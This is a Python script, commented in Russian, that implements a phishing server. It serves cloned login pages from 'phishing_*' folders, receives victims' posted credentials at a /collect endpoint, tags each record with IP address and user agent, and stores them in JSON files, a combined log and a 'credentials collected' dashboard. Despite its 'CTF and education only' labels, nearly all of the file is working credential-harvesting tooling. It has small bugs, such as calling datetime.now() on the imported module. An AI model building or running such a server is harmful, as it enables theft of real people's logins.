#!/usr/bin/env python3
"""
Phishing Server - Простой HTTP сервер для сохранения данных с фишинговых страниц
ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!
"""

import http.server
import socketserver
import json
import os
import datetime
from urllib.parse import urlparse, parse_qs
from utils import *

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    """Обработчик HTTP запросов для фишингового сервера"""
    
    def do_POST(self):
        """Обработка POST запросов с данными"""
        if self.path == '/collect':
            self.handle_data_collection()
        else:
            self.send_error(404)
    
    def handle_data_collection(self):
        """Обработка сбора данных"""
        try:
            # Получаем длину контента
            content_length = int(self.headers['Content-Length'])
            
            # Читаем данные
            post_data = self.rfile.read(content_length)
            
            # Парсим JSON
            data = json.loads(post_data.decode('utf-8'))
            
            # Добавляем метаданные
            data['server_timestamp'] = datetime.now().isoformat()
            data['client_ip'] = self.client_address[0]
            data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
            
            # Сохраняем в файл
            self.save_credentials(data)
            
            # Отправляем ответ
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            response = {'status': 'success', 'message': 'Data collected'}
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
            print_success(f"Данные получены от {data.get('username', 'Unknown')}")
            
        except Exception as e:
            print_error(f"Ошибка обработки данных: {e}")
            self.send_error(500)
    
    def save_credentials(self, data):
        """Сохранение учетных данных в файл"""
        try:
            # Создаем папку для данных
            data_dir = "phishing_data"
            if not os.path.exists(data_dir):
                os.makedirs(data_dir)
            
            # Генерируем имя файла
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            username = data.get('username', 'unknown').replace('/', '_').replace('\\', '_')
            filename = f"{data_dir}/credentials_{username}_{timestamp}.json"
            
            # Сохраняем данные
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            
            print_success(f"Данные сохранены: {filename}")
            
            # Также сохраняем в общий лог
            log_file = f"{data_dir}/all_credentials.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{data['server_timestamp']}] {data.get('username', 'Unknown')} - {data.get('target', 'Unknown')}\n")
            
        except Exception as e:
            print_error(f"Ошибка сохранения: {e}")
    
    def do_GET(self):
        """Обработка GET запросов"""
        if self.path == '/':
            # Показываем список сохраненных данных
            self.show_data_summary()
        elif self.path.startswith('/phishing_') or self._is_domain_path():
            # Обработка фишинговых страниц
            self.serve_phishing_page()
        else:
            # Обычная обработка файлов
            super().do_GET()
    
    def _is_domain_path(self):
        """Проверка, является ли путь доменным (например /example.com/)"""
        path_parts = self.path.strip('/').split('/')
        if len(path_parts) >= 1 and path_parts[0]:
            # Проверяем, есть ли папка с таким доменом
            domain = path_parts[0]
            phishing_dirs = [d for d in os.listdir('.') if d.startswith('phishing_')]
            for phishing_dir in phishing_dirs:
                if domain in phishing_dir:
                    return True
        return False
    
    def serve_phishing_page(self):
        """Обслуживание фишинговых страниц"""
        try:
            # Извлекаем путь к фишинговой странице
            path_parts = self.path.strip('/').split('/')
            if len(path_parts) >= 1 and path_parts[0]:
                domain = path_parts[0]
                
                # Ищем фишинговую папку по домену
                phishing_dirs = [d for d in os.listdir('.') if d.startswith('phishing_')]
                
                target_dir = None
                for phishing_dir in phishing_dirs:
                    if domain in phishing_dir:
                        target_dir = phishing_dir
                        break
                
                if target_dir:
                    # Определяем какой файл отдавать
                    if len(path_parts) == 1 or path_parts[1] == '':
                        # Корневой путь - отдаем phishing.html
                        file_path = os.path.join(target_dir, 'phishing.html')
                    else:
                        # Подпуть - отдаем соответствующий файл
                        sub_path = '/'.join(path_parts[1:])
                        file_path = os.path.join(target_dir, sub_path)
                    
                    if os.path.exists(file_path):
                        # Определяем MIME тип
                        if file_path.endswith('.html'):
                            content_type = 'text/html'
                        elif file_path.endswith('.css'):
                            content_type = 'text/css'
                        elif file_path.endswith('.js'):
                            content_type = 'application/javascript'
                        elif file_path.endswith('.png'):
                            content_type = 'image/png'
                        elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                            content_type = 'image/jpeg'
                        else:
                            content_type = 'text/plain'
                        
                        # Читаем и отправляем файл
                        with open(file_path, 'rb') as f:
                            content = f.read()
                        
                        self.send_response(200)
                        self.send_header('Content-type', content_type)
                        self.end_headers()
                        self.wfile.write(content)
                        return
                
                # Если не найдена фишинговая страница, показываем 404
                self.send_error(404)
            else:
                self.send_error(404)
                
        except Exception as e:
            print_error(f"Ошибка обслуживания фишинговой страницы: {e}")
            self.send_error(500)
    
    def show_data_summary(self):
        """Показ сводки собранных данных"""
        try:
            data_dir = "phishing_data"
            if not os.path.exists(data_dir):
                os.makedirs(data_dir)
            
            # Считаем файлы
            json_files = []
            if os.path.exists(data_dir):
                json_files = [f for f in os.listdir(data_dir) if f.endswith('.json')]
            
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Data Collection - CTF Demo</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }}
        .header {{ background: #dc3545; color: white; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        .warning {{ background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        .stats {{ background: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        .file-list {{ background: #f8f9fa; border: 1px solid #dee2e6; padding: 15px; border-radius: 4px; }}
        .file-item {{ margin: 5px 0; padding: 5px; background: white; border-radius: 3px; }}
        .ctf-notice {{ color: #6c757d; font-size: 12px; text-align: center; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔍 Phishing Data Collection</h1>
        </div>
        
        <div class="warning">
            <strong>⚠️ CTF DEMO SERVER</strong><br>
            This server is for educational purposes only. All data collection is simulated for CTF scenarios.
        </div>
        
        <div class="stats">
            <h3>📊 Statistics</h3>
            <p><strong>Total credentials collected:</strong> {len(json_files)}</p>
            <p><strong>Server running since:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="file-list">
            <h3>📁 Collected Data Files</h3>
            {"".join([f'<div class="file-item">📄 {file}</div>' for file in json_files]) if json_files else '<div class="file-item">No data collected yet</div>'}
        </div>
        
        <div class="ctf-notice">
            CTF DEMO - Phishing Data Collection Server
        </div>
    </div>
</body>
</html>
"""
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))
            
        except Exception as e:
            print_error(f"Ошибка показа данных: {e}")
            self.send_error(500)

def start_phishing_server(port=8080):
    """Запуск фишингового сервера"""
    print_warning("⚠️  ФИШИНГОВЫЙ СЕРВЕР - ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!")
    print_warning("⚠️  НЕ ИСПОЛЬЗУЙТЕ ДЛЯ НЕЗАКОННЫХ ЦЕЛЕЙ!")
    print()
    
    try:
        with socketserver.TCPServer(("", port), PhishingHandler) as httpd:
            print_success(f"Фишинговый сервер запущен на порту {port}")
            print_info(f"Доступен по адресу: http://localhost:{port}")
            print_info("Для остановки нажмите Ctrl+C")
            print()
            
            # Создаем папку для данных
            data_dir = "phishing_data"
            if not os.path.exists(data_dir):
                os.makedirs(data_dir)
                print_success(f"Создана папка для данных: {data_dir}")
            
            httpd.serve_forever()
            
    except KeyboardInterrupt:
        print_success("\nСервер остановлен")
    except Exception as e:
        print_error(f"Ошибка запуска сервера: {e}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Phishing Server - ТОЛЬКО ДЛЯ CTF!')
    parser.add_argument('--port', type=int, default=8080, help='Порт для сервера')
    
    args = parser.parse_args()
    
    start_phishing_server(args.port)

if __name__ == "__main__":
    main()
